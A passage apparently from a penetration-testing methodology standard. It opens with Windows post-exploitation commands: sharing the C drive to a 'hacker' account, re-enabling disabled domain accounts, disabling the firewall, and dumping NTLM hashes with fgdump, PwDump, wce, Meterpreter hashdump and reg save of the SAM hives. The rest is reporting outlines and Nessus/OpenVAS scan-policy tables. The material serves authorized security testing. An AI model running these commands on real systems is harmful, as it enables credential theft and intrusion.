|net share nothing$=C:\ /grant:hacker,FULL /unlimited|<p>Shares the C drive (you can specify any drive) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive. </p><p>One thing to note is that in newer (will have to look up exactly when, I believe since XP SP2) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is something to keep in mind </p>|
|net user username /active:yes /domain|Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched. |
|netsh firewall set opmode disable|Disables the local windows firewall |
|netsh firewall set opmode enable|Enables the local windows firewall. If rules are not in place for your connection, this could cause you to loose it. |
#### **Support Tools Binaries / Links / Usage**
REMEMBER: DO NOT RUN BINARIES YOU HAVEN’T VETTED 

|**Description** |**Link to download** |
| :-: | :-: |
|carrot.exe /im /ie /ff /gc /wlan /vnc /ps /np /mp /dialup /pwdump|<http://h.ackack.net/carrot-exe.html>|
|PwDump7.exe > ntlm.txt|<p><http://www.tarasco.org/security/pwdump_7/> </p><p>Invasively Dumps Windows NTLM hashes. Holds the credentials for all accounts. </p>|
|Nircommands |<http://www.nirsoft.net/utils/nircmd.html> A collection of small nifty features. |
|wce.exe|<p><http://www.ampliasecurity.com/research/wce_v1_2.tgz> </p><p>Pull NTLM hashes from login sessions out of memory, steal ks tickets from activerberoe processes and apply them to others. </p>|
|adfind.exe -b ou=ActiveDirectory,dc=example,dc=com -f "objectClass=user" sn givenName samaccountname -nodn -adcsv > exported\_users.csv|<http://www.joeware.net/freetools/> Joeware tools have been used by admins for a while. This command will output the firstname, lastname and username of everyone in the AD domain example.com. Edit as needed. |
##### **Various tools**
(e.g. \\hackarmoury.com\tools\all\_binaries\fgdump.exe) Some examples of protocols in use: 

<http://hackarmoury.com/tools>

\\hackarmoury.com\tools 

[ftp://hackarmoury.com](ftp://hackarmoury.com/)

<svn://hackarmoury.com>
### **Obtaining Password Hashes in Windows**
There are two general methods for obtaining the password hashes in Windows. One method is to inject code into the LSASS (Local Security Authority Subsystem Service) process and the other is to extract the hashes from the SAM, system, and security registry hives. Pwdump6, Fgdump, and the hashdump command in Meterpreter use the LSASS injection method and Creddump extracts passwords from the SAM, system, and security hives. Once the hashes have been extracted, you can crack the hashes to obtain the passwords or you can use the hashes in a pass the hash exploit. 
#### **LSASS Injection**
One of the pitfalls of using the LSASS injection method is the possibility of crashing the LSASS process, which will reboot the machine. Another pitfall is tools like Pwdump and Fgdump are often stopped by AV tools. 
##### **Pwdump6 and Fgdump**
Pwdump6 and Fgdump are available at <http://www.foofus.net/~fizzgig>. Fgdump implements a number of features that Pwdump6 does not and is the preferred tool to use. Also, the user account must be an administrator on the target machine. 

- To dump passwords on the local host with the credential of the current user use: fgdump
- To dump passwords on the local host with other credentials use: fgdump -h 127.0.0.1 -u adminuser
- To dump passwords on a remote host with specified credentials use: fgdump -h 192.168.0.1 -u adminuser -p password
##### **Hashdump in Meterpreter**
From the meterpreter prompt run hashdump. 

meterpreter > hashdump

Guest:501:\*\*\*\*\*\*NOPASSWORD\*\*\*\*\*\*\*:31d6cfe0d16ae931b73c59d7e0c089c0:::

HelpAssistant:1000:\*\*\*\*\*\*NOPASSWORD\*\*\*\*\*\*\*:ee96955033d6fa723cc2fccb7bec093d:::
#### **Extracting Passwords from Registry**
You will need to copy the SAM, system, and security files from the target machine to your machine. The files are located in C:\WINDOWS\system32\config and are typically inaccessible while the machine is running. Fortunately, you can get a copy of the files from the registry in HKEY\_LOCAL\_MACHINE and some times you can find them in c:\WINDOWS\repair. 
##### **Copy from the Registry**
reg save HKLM\SAM c:\sam.reg

reg save HKLM\SYSTEM c:\system.reg

reg save HKLM\SECURITY c:\security.reg

If you get an "Access Denied" error message when trying to save the SECURITY hive then try: 

at 12:00 reg save HKLM\SECURITY c:\security.reg

You are using the at command to schedule the reg command so set the time appropriately. 
##### **Extracting the Hashes**
Creddump includes three python scripts designed to extract the local password hashes (pwdump.py), the cached credentials (cachedump.py), and the LSA secrets (lsadump.py). To get the local password hashes use: pwdump.py system.reg sam.reg. To get the cached credentials use: cachedump.py system.reg security.reg. 
#### **Extracting Passwords from Registry using Meterpreter**
In Meterpreter use the command run post/windows/gather/hashdump to get the local hashes from the SAM database. To get the cached hashes you will need to download the cachedump.rb module from <http://lab.mediaservice.net/code/cachedump.rb> and put it into <msf3>/modules/post/windows/gather. Then you can run the command run post/windows/gather/cachedump. 
## **Reporting**
<Contribution Needed>
### **Executive-Level Reporting**
<Contribution Needed>

1\. Business Impact 

2\. Customization 

3\. Talking to the business 

4\. Affect bottom line 

5\. Strategic Roadmap 

6\. Maturity model 

7\. Appendix with terms for risk rating 
### **Technical Reporting**
<Contribution Needed>

1\. Identify systemic issues and technical root cause analysis 

2\. Maturity Model 

3\. Technical Findings 

- Description
- Screen shots
- Ensure all PII is correctly redacted
- Request/Response captures
- PoC examples
- Ensure PoC code provides benign validation of the flaw

4\. Reproducible Results 

- Test Cases
- Fault triggers

5\. Incident response and monitoring capabilities 

- Intelligence gathering
- Reverse IDS
- Pentest Metrics
- Vuln. Analysis
- Exploitation
- Post-exploitation
- Residual effects (notifications to
  3rd parties, internally, LE, etc...)

6\. Common elements 

- Methodology
- Objective(s)
- Scope
- Summary of findings
- Appendix with terms for risk rating

### **Quantifying the risk**
<Contribution Needed>

1\. Evaluate incident frequency 

- probable event frequency
- estimate threat capability
  (from 3 - threat modeling)
- Estimate controls strength (6)
- Compound vulnerability (5)
- Level of skill required
- Level of access required

2\. Estimate loss magnitude per incident 

- Primary loss
- Secondary loss
- Identify risk root cause analysis
- Root Cause is never a patch
- Identify Failed Processes

3\. Derive Risk 

- Threat
- Vulnerability
- Overlap
### **Deliverable**
<Contribution Needed>

1\. Preliminary results 

2\. Review of the report with the customer 

3\. Adjustments to the report 

4\. Final report 

5\. Versioning of Draft and Final Reports 

6\. Presentation 

- Technical
- Management Level

7\. Workshop / Training 

- Gap Analysis (skills/training)

8\. Exfiltarted evidence and any other raw (non-proprietary) data
gathered. 

9\. Remediation Roadmap 

- Triage
- Maturity Model
- Progression Roadmap
- Long-term Solutions
- Defining constraints
## **Custom tools developed**
# **Appendix A - Creating OpenVAS "Only Safe Checks" Policy**
In order to ensure that all tests are conducted with the same criteria, you will need to ensure that you have the correct OpenVAS Global Settings. In order to do this you will need to connect to the OpenVAS Server and modifiy the Global Settings. There are seven configuration tabs: General, Credentials, Target Selection, Access Rules, Prefs., and KB. For our purposes, most of the default settings do not need to be modified. 
## **General**
The General tab is where we will set certain scan options. The actual settings have been defined as indicated below: 

|**General Scan Options Section**|**Setting**|
| :- | :- |
|Port Range |1-65535 |
|Consider unscanned ports as closed |Unchecked |
|Checks to perform concurrently |4 |
|Path to CGIs |/cgi-bin:/scripts |
|Do a reverse lookup of the IP before testing it |Unchecked |
|Safe checks |Checked |
|Designate hosts by their MAC address |Unchecked |
|  |  |
|**Port Scanner Section**|**Setting**|
|ike-scan (NASL wrapper) |Checked |
|Snmpwalk 'scanner' |Checked |
|SYN Scan |Checked |
|Exclude toplevel domain wildcard hosts |Unchecked |
|portbunny (NASL wrapper) |Unchecked |
|strobe (NASL wrapper) |Unchecked |
|Scan for LaBrea tarpitted hosts |Checked |
|amap (NASL wrapper) |Unchecked |
|pnscan (NASL wrapper) |Unchecked |
|Netstat 'scanner' |Unchecked |
|Simple TCP portscan in NASL |Unchecked |
|OpenVAS TCP scanner |Checked |
|Ping Host |Checked |
|Nmap (NASL wrapper) |Checked |
## **Plugins**
The Plugins tab, allows us to choose specific security checks by plugin family or individual checks that we want to enable. The easiest way to set this is to select the "Enable All" button from the main Plugins tab, however this assumes the Safe Checks is selected from the General Tab. 
## **Credentials**
The Credentials tab, allows us to configure the Nessus scanner to use authentication credentials during scanning. For our policy we will not edit any of the settings within this section. They are however documented to ensure completeness. 

|**SMB Authorization**|**Setting**|
| :- | :- |
|SMB login |Blank |
|SMB password |Blank |
|SMB domain (optional) |Blank |
|  |  |
|**SSH Authorization** |**Setting**|
|Per-host SSH key Selection (localhost) |Select SSH Login |
|Per-host SSH key Selection (Default) |Select SSH Login |
|User per-target login information |Unchecked |
|SSH login name |sshovas |
|SSH password (unsafe!) |Blank |
|SSH public key |Blank |
|SSH private key |Blank |
|SSH key passphrase |Blank |
## **Target Selection**
The Target Selection tab, allows us to specify specific targets or to read them from a file. The main then to ensure that is checked is the Perform a DNS zone transfer. 
## **Access Rules**
The Access Selection tab, allows us to view and manage the access rules for our scanner. These rules determine which host you may scan. Note that there are three kinds of access rules: 

Server rules, Serverside user rules, and Clientside user rules. Server rules are global to the server and will affect all users that connect to this server. Serverside user rules are specific to a user and affect only this user, no matter from which client he connects to this server. Finally, Clientside user rules are specific to the client. They will affect only the scope in which they are defined. 
## **Preferences**
The Preferences tab allows for more granular control over scan settings. All items in this category should be left alone. 
## **Knowledge Base**
The configuration section for the Knowledge Base (KB) allows you to control the management of the server-side scan results. Information retrieved by plugins is collected in a KB during a scan. This is done on a per-host basis, meaning there is one KB for every host scanned. The default is to discard the KB once all plugins have finished, but under certain circumstances it can be quite useful to tell the server to keep the KBs generated during the scan and use them again at a later time. 

# **Appendix B - Creating the "Only Safe Checks" Policy**
In order to ensure that all tests are conducted with the same criteria, you will need to ensure that you have created a policy called "Only Safe Checks." In order to do this you will need to connect to the Nessus server UI, so that you can create a custom policy by clicking on the "Policies" option on the bar at the top and then "+ Add" button on the right. The "Add Policy" screen will be displayed as follows: 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_162.png "File:Penetration Testing Execution 162.png") 

There are four configuration tabs: General, Credentials, Plugins, and Preferences. For our purposes, most of the default settings do not need to be modified. 
## **General**
The General tab is where we will name and configure scan options related to our policy. There are six boxes of grouped options that control scanner behavior: Basic, Scan, Network Congestion, Port Scanners, Port Scan Options, and Performance. 

Basic allows us to define the policy itself. The actual settings have been defined as indicated below: 

|**Basic Section**|**Setting**|
| :- | :- |
|Name |Only Safe Checks |
|Visibility |Shared |
|Description |Complete scans not including Denial of Service. |
|**Scan Section**|**Setting**|
|Save Knowledge Base |Checked |
|Safe Checks |Checked |
|Silent Dependencies |Checked |
|Log Scan Details to Server |Unchecked |
|Stop Host Scan on Disconnect |Unchecked |
|Avoid Sequential Scans |Unchecked |
|Consider Unscanned Ports as Closed |Unchecked |
|Designate Hosts by their DNS Name |Unchecked |
|  |  |
|**Network Section**|**Setting**|
|Reduce Parallel Connections on Congestion |Unchecked |
|Use Kernel Congestion Detection (Linux Only) |Unchecked |
|  |  |
|**Port Scanners Section**|**Setting**|
|TCP Scan |Checked |
|UDP Scan |Unchecked |
|SYN Scan |Unchecked |
|SNMP Scan |Checked |
|Netstat SSH Scan |Checked |
|Netstat WMI Scan |Checked |
|Ping Host |Unchecked |
|  |  |
|**Port Scan Options Section**|**Setting**|
|Port Scan Range |1-65535 |
|**Performance Section**|**Setting**|
|Max Checks Per Host (Windows) |5 |
|Max Checks Per Host (Linux) |50-75 |
|Max Hosts Per Scan |5 |
|Network Receive Timeout (seconds) |5 |
|Max Simultaneous TCP Sessions Per Host |Unlimited |
|Max Simultaneous TCP Sessions Per Scan |Unlimited |
## **Credentials**
The Credentials tab, allows us to configure the Nessus scanner to use authentication credentials during scanning. For our policy we will not edit any of the settings within this section. They are however documented to ensure completeness. 

|**Windows credentials**|**Setting**|
| :- | :- |
|SMB account |Blank |
|SMB password |Blank |
|SMB domain (optional) |Blank |
|SMB password type |Password |
|Additional SMB account (1) |Blank |
|Additional SMB password (1) |Blank |
|Additional SMB domain (optional)(1) |Blank |
|Additional SMB account (2) |Blank |
|Additional SMB password (2) |Blank |
|Additional SMB domain (optional)(2) |Blank |
|Additional SMB account (3) |Blank |
|Additional SMB password (3) |Blank |
|Additional SMB domain (optional)(3) |Blank |
|Never send SMB credentials in clear text |Checked |
|Only use NTLMv2 |Unchecked |
|  |  |
|**SSH Settings** |**Setting**|
|SSH user name |root |
|SSH password (unsafe!) |Blank |
|SSH public key to use |Blank |
|SSH private key to use |Blank |
|Passphrase for SSH key |Blank |
|Elevate privileges with |Nothing |
|su login |Blank |
|Escalation password |Blank |
|SSH known hosts file |Blank |
|Preferred SSH port |22 |
|Client version |OpenSSH\_5.0 |
|  |  |
|**Kerberos configuration**|**Settings**|
|Kerberos Key Distribution Center (KDC) |Blank |
|Kerberos KDC Port |88 |
|Kerberos KDC Transport |UDP |
|Kerberos Realm (SSH only) |Blank |
|  |  |
|**Cleartext protocols settings**|**Settings**|
|User name |Blank |
|Password (unsafe!) |Blank |
|Try to perform patch level checks over telnet |Unchecked |
|Try to perform patch level checks over rsh |Unchecked |
|Try to perform patch level checks over rexec |Unchecked |
## **Plugins**
The Plugins tab, allows us to choose specific security checks by plugin family or individual checks that we want to enable. The easiest way to set this is to select the "Enable All" button from the main Plugins tab, however this assumes the Safe Checks is selected from the General Tab. 
## **Preferences**
The Preferences tab allows for more granular control over scan settings. All items in this category should be. The actual settings have been defined as indicated below: 

|**Cisco IOS Compliance Checks**|**Setting**|
| :- | :- |
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Database Compliance Checks** |**Setting**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Database Settings** |**Setting**|
|Login |Blank |
|Password |Blank |
|DB Type |Oracle |
|Database SID |Blank |
|Database port to use |Blank |
|Oracle auth type |NORMAL |
|SQL Server auth type |Windows |
|  |  |
|**Do not scan fragile devices**|**Setting**|
|Scan Network Printers |Unchecked |
|Scan Novell Netware hosts |Unchecked |
|  |  |
|**Global variable settings**|**Setting**|
|Probe services on every port |Checked |
|Do not log in with user accounts not<br>specified in the policy |Unchecked |
|Enable CGI scanning |Checked |
|Network type |Mixed (use RFC 1918) |
|Enable experimental scripts |Unchecked |
|Thorough tests (slow) |Unchecked |
|Report verbosity |Normal |
|Report paranoia |Normal |
|HTTP User-Agent |Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0) |
|SSL certificate to use |Blank |
|SSL CA to trust |Blank |
|SSL key to use |Blank |
|SSL password for SSL key |Blank |
|  |  |
|**HTTP cookies import**|**Settings**|
|Cookies file |Blank |
|  |  |
|**HTTP login page**|**Settings**|
|Login page |/ |
|Login form |Blank |
|Login form fields |user=%USER%&password=%PASS% |
|Login form method |POST |
|Re-authenticate delay (seconds) |Blank |
|Check authentication on page |Blank |
|Follow 30x redirections (# of levels) |2 |
|Authenticated regex |Blank |
|Invert test (disconnected if regex matches) |Unchecked |
|Match regex on HTTP headers |Unchecked |
|Case insensitive regex |Unchecked |
|  |  |
|**ICCP/COTP TSAP Addressing**|**Settings**|
|Start COTP TSAP |8 |
|Stop COTP TSAP |8 |
|  |  |
|**Login configurations**|**Settings**|
|HTTP account |Blank |
|HTTP password (sent in clear) |Blank |
|NNTP account |Blank |
|NNTP password (sent in clear) |Blank |
|FTP account |Anonymous |
|FTP password (sent in clear) |  |
|FTP writeable directory |/incoming |
|POP2 account |Blank |
|POP2 password (sent in clear) |Blank |
|POP3 account |Blank |
|POP3 password (sent in clear) |Blank |
|IMAP account |Blank |
|IMAP password (sent in clear) |Blank |
|  |  |
|**Modbus/TCP Coil Access**|**Settings**|
|Start reg |0 |
|End reg |16 |
|  |  |
|**Nessus SYN scanner**|**Settings**|
|Firewall detection |Automatic (normal) |
|  |  |
|**Nessus TCP scanner**|**Settings**|
|Firewall detection |Automatic (normal) |
|  |  |
|**News Server (NNTP) Information Disclosure**|**Settings**|
|From address |Nessus <listme@listme.dsbl.org> |
|Test group name regex |f[a-z]\.tests? |
|Max crosspost |7 |
|Local distribution |Checked |
|No archive |Unchecked |
|  |  |
|**Nikto (NASL wrapper)**|**Settings**|
|Enable Nikto |Unchecked |
|Disable if server never replies 404 |Unchecked |
|Root directory |Blank |
|Pause between tests (s) |Blank |
|Scan CGI directories |User supplied |
|Display: 1 Show redirects |Unchecked |
|Display: 2 Show cookies received |Unchecked |
|Display: 3 Show all 200/OK responses |Unchecked |
|Display: 4 Show URLs which require authentication |Unchecked |
|Display: V Verbose Output |Unchecked |
|Tuning: 1 Interesting File/Seen in logs |Unchecked |
|Tuning: 2 Misconfiguration / Default File |Unchecked |
|Tuning: 3 Information Disclosure |Unchecked |
|Tuning: 4 Injection (XSS/Script/HTML) |Unchecked |
|  |  |
|**Oracle Settings**|**Settings**|
|Oracle SID |Blank |
|Test default accounts (slow) |Unchecked |
|  |  |
|**PCI DSS Compliance**|**Settings**|
|Check for PCI-DSS compliance |Unchecked |
|  |  |
|**Ping the remote host**|**Settings**|
|TCP ping destination port(s) |Built-in |
|Do an ARP ping |Checked |
|Do a TCP ping |Checked |
|Do an ICMP ping |Checked |
|Number of Retries (ICMP) |2 |
|Do an applicative UDP ping (DNS, RPCÖ) |Unchecked |
|Make the dead hosts appear in the report |Unchecked |
|Log live hosts in the report |Unchecked |
|Test the local Nessus host |Checked |
|Fast network discovery |Unchecked |
|  |  |
|**Port scanners settings**|**Settings**|
|Check open TCP ports found by local port enumerators |Unchecked |
|Only run network port scanners if local port enumeration failed |Checked |
|  |  |
|**SMB Registry: Start the Registry Service during the scan**|**Settings**|
|Start the Registry Service during the scan |Unchecked |
|  |  |
|**SMB Scope**|**Settings**|
|Request information about the domain |Checked |
|  |  |
|**SMB use domain SID to enumerate users**|**Settings**|
|Start UID |1000 |
|End UID |1200 |
|  |  |
|**SMB use host SID to enumerate local users**|**Settings**|
|Start UID |1000 |
|End UID |1200 |
|  |  |
|**SMTP settings**|**Settings**|
|Third party domain |Example.com |
|From address |nobody@example.com |
|To address |postmaster@[AUTO\_REPLACED\_IP] |
|  |  |
|**SNMP settings**|**Settings**|
|Community name |Public |
|UDP port |161 |
|SNMPv3 user name |Blank |
|SNMPv3 authentication password |Blank |
|SNMPv3 authentication algorithm |MD5 |
|SNMPv3 privacy password |Blank |
|SNMPv3 privacy algorithm |DES |
|  |  |
|**Service Detection**|**Settings**|
|Test SSL based services |Known SSL ports |
|  |  |
|**Unix Compliance Checks**|**Settings**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Web Application Tests Settings**|**Settings**|
|Enable web applications tests |Unchecked |
|Maximum run time (min) |60 |
|Send POST requests |Unchecked |
|Combinations of arguments values |one value |
|HTTP Parameter Pollution |Unchecked |
|Stop at first flaw |Per port (quicker) |
|Test embedded web servers |Unchecked |
|URL for Remote File Inclusion |<http://rfi.nessus.org/rfi.txt>|
|  |  |
|**Web mirroring**|**Settings**|
|Number of pages to mirror |1000 |
|Maximum depth |6 |
|Start page |/ |
|Excluded items regex |/server\_privileges\.php |
|Follow dynamic pages |Unchecked |
|  |  |
|**Windows Compliance Checks**|**Settings**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Windows File Contents Compliance Checks**|**Settings**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
# **Appendix C - Creating the "Only Safe Checks (Web)" Policy**
In order to ensure that all tests are conducted with the same criteria, you will need to ensure that you have created a policy called "Only Safe Checks (Web)". In order to do this you will need to connect to the Nessus server UI, so that you can create a custom policy by clicking on the "Policies" option on the bar at the top and then "+ Add" button on the right. The "Add Policy" screen will be displayed as follows:

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_163.png "File:Penetration Testing Execution 163.png") 

There are four configuration tabs: General, Credentials, Plugins, and Preferences. For our purposes, most of the default settings do not need to be modified. 
## **General**
The General tab is where we will name and configure scan options related to our policy. There are six boxes of grouped options that control scanner behavior: Basic, Scan, Network Congestion, Port Scanners, Port Scan Options, and Performance. 

Basic allows us to define the policy itself. The actual settings have been defined as indicated below: 

|**Basic Section**|**Setting**|
| :- | :- |
|Name |Only Safe Checks (Web) |
|Visibility |Shared |
|Description |Complete scans not including Denial of Service. |
|**Scan Section**|**Setting**|
|Save Knowledge Base |Checked |
|Safe Checks |Checked |
|Silent Dependencies |Checked |
|Log Scan Details to Server |Unchecked |
|Stop Host Scan on Disconnect |Unchecked |
|Avoid Sequential Scans |Unchecked |
|Consider Unscanned Ports as Closed |Unchecked |
|Designate Hosts by their DNS Name |Unchecked |
|  |  |
|**Network Section**|**Setting**|
|Reduce Parallel Connections on Congestion |Unchecked |
|Use Kernel Congestion Detection (Linux Only) |Unchecked |
|  |  |
|**Port Scanners Section**|**Setting**|
|TCP Scan |Checked |
|UDP Scan |Unchecked |
|SYN Scan |Unchecked |
|SNMP Scan |Checked |
|Netstat SSH Scan |Checked |
|Netstat WMI Scan |Checked |
|Ping Host |Unchecked |
|  |  |
|**Port Scan Options Section**|**Setting**|
|Port Scan Range |1-65535|
|**Performance Section**|**Setting**|
|Max Checks Per Host (Windows) |5 |
|Max Checks Per Host (Linux) |50-75 |
|Max Hosts Per Scan |5 |
|Network Receive Timeout (seconds) |5 |
|Max Simultaneous TCP Sessions Per Host |Unlimited |
|Max Simultaneous TCP Sessions Per Scan |Unlimited |
## **Credentials**
The Credentials tab, allows us to configure the Nessus scanner to use authentication credentials during scanning. For our policy we will not edit any of the settings within this section. They are however documented to ensure completeness. 

|**Windows credentials**|**Setting**|
| :- | :- |
|SMB account |Blank |
|SMB password |Blank |
|SMB domain (optional) |Blank |
|SMB password type |Password |
|Additional SMB account (1) |Blank |
|Additional SMB password (1) |Blank |
|Additional SMB domain (optional)(1) |Blank |
|Additional SMB account (2) |Blank |
|Additional SMB password (2) |Blank |
|Additional SMB domain (optional)(2) |Blank |
|Additional SMB account (3) |Blank |
|Additional SMB password (3) |Blank |
|Additional SMB domain (optional)(3) |Blank |
|Never send SMB credentials in clear text |Checked |
|Only use NTLMv2 |Unchecked |
|  |  |
|**SSH Settings** |**Setting**|
|SSH user name |root |
|SSH password (unsafe!) |Blank |
|SSH public key to use |Blank |
|SSH private key to use |Blank |
|Passphrase for SSH key |Blank |
|Elevate privileges with |Nothing |
|su login |Blank |
|Escalation password |Blank |
|SSH known\_hosts file |Blank |
|Preferred SSH port |22 |
|Client version |OpenSSH\_5.0 |
|  |  |
|**Kerberos configuration**|**Settings**|
|Kerberos Key Distribution Center (KDC) |Blank |
|Kerberos KDC Port |88 |
|Kerberos KDC Transport |UDP |
|Kerberos Realm (SSH only) |Blank |
|  |  |
|**Cleartext protocols settings**|**Settings**|
|User name |Blank |
|Password (unsafe!) |Blank |
|Try to perform patch level checks over telnet |Unchecked |
|Try to perform patch level checks over rsh |Unchecked |
|Try to perform patch level checks over rexec |Unchecked |
## **Plugins**
The Plugins tab, allows us to choose specific security checks by plugin family or individual checks that we want to enable. The easiest way to set this is to select the "Enable All" button from the main Plugins tab, however this assumes the Safe Checks is selected from the General Tab. 
## **Preferences**
The Preferences tab allows for more granular control over scan settings. All items in this category should be. The actual settings have been defined as indicated below: 

|**Cisco IOS Compliance Checks**|**Setting**|
| :- | :- |
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Database Compliance Checks** |**Setting**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Database Settings** |**Setting**|
|Login |Blank |
|Password |Blank |
|DB Type |Oracle |
|Database SID |Blank |
|Database port to use |Blank |
|Oracle auth type |NORMAL |
|SQL Server auth type |Windows |
|  |  |
|**Do not scan fragile devices**|**Setting**|
|Scan Network Printers |Unchecked |
|Scan Novell Netware hosts |Unchecked |
|  |  |
|**Global variable settings**|**Setting**|
|Probe services on every port |Checked |
|Do not log in with user accounts not<br>specified in the policy |Unchecked |
|Enable CGI scanning |Checked |
|Network type |Mixed (use RFC 1918) |
|Enable experimental scripts |Unchecked |
|Thorough tests (slow) |Unchecked |
|Report verbosity |Normal |
|Report paranoia |Normal |
|HTTP User-Agent |Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0) |
|SSL certificate to use |Blank |
|SSL CA to trust |Blank |
|SSL key to use |Blank |
|SSL password for SSL key |Blank |
|  |  |
|**HTTP cookies import**|**Settings**|
|Cookies file |Blank |
|  |  |
|**HTTP login page**|**Settings**|
|Login page |/ |
|Login form |Blank |
|Login form fields |user=%USER%&password=%PASS% |
|Login form method |POST |
|Re-authenticate delay (seconds) |Blank |
|Check authentication on page |Blank |
|Follow 30x redirections (# of levels) |2 |
|Authenticated regex |Blank |
|Invert test (disconnected if regex matches) |Unchecked |
|Match regex on HTTP headers |Unchecked |
|Case insensitive regex |Unchecked |
|  |  |
|**ICCP/COTP TSAP Addressing**|**Settings**|
|Start COTP TSAP |8 |
|Stop COTP TSAP |8 |
|  |  |
|**Login configurations**|**Settings**|
|HTTP account |Blank |
|HTTP password (sent in clear) |Blank |
|NNTP account |Blank |
|NNTP password (sent in clear) |Blank |
|FTP account |Anonymous |
|FTP password (sent in clear) |  |
|FTP writeable directory |/incoming |
|POP2 account |Blank |
|POP2 password (sent in clear) |Blank |
|POP3 account |Blank |
|POP3 password (sent in clear) |Blank |
|IMAP account |Blank |
|IMAP password (sent in clear) |Blank |
|  |  |
|**Modbus/TCP Coil Access**|**Settings**|
|Start reg |0 |
|End reg |16 |
|  |  |
|**Nessus SYN scanner**|**Settings**|
|Firewall detection |Automatic (normal) |
|  |  |
|**Nessus TCP scanner**|**Settings**|
|Firewall detection |Automatic (normal) |
|  |  |
|**News Server (NNTP) Information Disclosure**|**Settings**|
|From address |Nessus <listme@listme.dsbl.org> |
|Test group name regex |f[a-z]\.tests? |
|Max crosspost |7 |
|Local distribution |Checked |
|No archive |Unchecked |
|  |  |
|**Nikto (NASL wrapper)**|**Settings**|
|Enable Nikto |Checked |
|Disable if server never replies 404 |Unchecked |
|Root directory |Blank |
|Pause between tests (s) |Blank |
|Scan CGI directories |User supplied |
|Display: 1 Show redirects |Unchecked |
|Display: 2 Show cookies received |Unchecked |
|Display: 3 Show all 200/OK responses |Unchecked |
|Display: 4 Show URLs which require authentication |Unchecked |
|Display: V Verbose Output |Unchecked |
|Tuning: 1 Interesting File/Seen in logs |Unchecked |
|Tuning: 2 Misconfiguration / Default File |Unchecked |
|Tuning: 3 Information Disclosure |Unchecked |
|Tuning: 4 Injection (XSS/Script/HTML) |Unchecked |
|  |  |
|**Oracle Settings**|**Settings**|
|Oracle SID |Blank |
|Test default accounts (slow) |Unchecked |
|  |  |
|**PCI DSS Compliance**|**Settings**|
|Check for PCI-DSS compliance |Unchecked |
|  |  |
|**Ping the remote host**|**Settings**|
|TCP ping destination port(s) |Built-in |
|Do an ARP ping |Checked |
|Do a TCP ping |Checked |
|Do an ICMP ping |Checked |
|Number of Retries (ICMP) |2 |
|Do an applicative UDP ping (DNS, RPCÖ) |Unchecked |
|Make the dead hosts appear in the report |Unchecked |
|Log live hosts in the report |Unchecked |
|Test the local Nessus host |Checked |
|Fast network discovery |Unchecked |
|  |  |
|**Port scanners settings**|**Settings**|
|Check open TCP ports found by local port enumerators |Unchecked |
|Only run network port scanners if local port enumeration failed |Checked |
|  |  |
|**SMB Registry: Start the Registry Service during the scan**|**Settings**|
|Start the Registry Service during the scan |Unchecked |
|  |  |
|**SMB Scope**|**Settings**|
|Request information about the domain |Checked |
|  |  |
|**SMB use domain SID to enumerate users**|**Settings**|
|Start UID |1000 |
|End UID |1200 |
|  |  |
|**SMB use host SID to enumerate local users**|**Settings**|
|Start UID |1000 |
|End UID |1200 |
|  |  |
|**SMTP settings**|**Settings**|
|Third party domain |Example.com |
|From address |nobody@example.com |
|To address |postmaster@[AUTO\_REPLACED\_IP] |
|  |  |
|**SNMP settings**|**Settings**|
|Community name |Public |
|UDP port |161 |
|SNMPv3 user name |Blank |
|SNMPv3 authentication password |Blank |
|SNMPv3 authentication algorithm |MD5 |
|SNMPv3 privacy password |Blank |
|SNMPv3 privacy algorithm |DES |
|  |  |
|**Service Detection**|**Settings**|
|Test SSL based services |Known SSL ports |
|  |  |
|**Unix Compliance Checks**|**Settings**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Web Application Tests Settings**|**Settings**|
|Enable web applications tests |Checked |
|Maximum run time (min) |60 |
|Send POST requests |Unchecked |
|Combinations of arguments values |one value |
|HTTP Parameter Pollution |Unchecked |
|Stop at first flaw |Per port (quicker) |
|Test embedded web servers |Unchecked |
|URL for Remote File Inclusion |<http://rfi.nessus.org/rfi.txt>|
|  |  |
|**Web mirroring**|**Settings**|
|Number of pages to mirror |1000 |
|Maximum depth |6 |
|Start page |/ |
|Excluded items regex |/server\_privileges\.php |
|Follow dynamic pages |Unchecked |
|  |  |
|**Windows Compliance Checks**|**Settings**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
|  |  |
|**Windows File Contents Compliance Checks**|**Settings**|
|Policy file #1 |Blank |
|Policy file #2 |Blank |
|Policy file #3 |Blank |
|Policy file #4 |Blank |
|Policy file #5 |Blank |
# **Appendix D - Creating the "Validation Scan" Policy**
In order to ensure that all tests are conducted with the same criteria, you will need to ensure that you have created a policy called "Validation Scan." In order to do this you will need to connect to the Nessus server UI, so that you can create a custom policy by clicking on the "Policies" option on the bar at the top and then "+ Add" button on the right. The "Add Policy" screen will be displayed as follows:

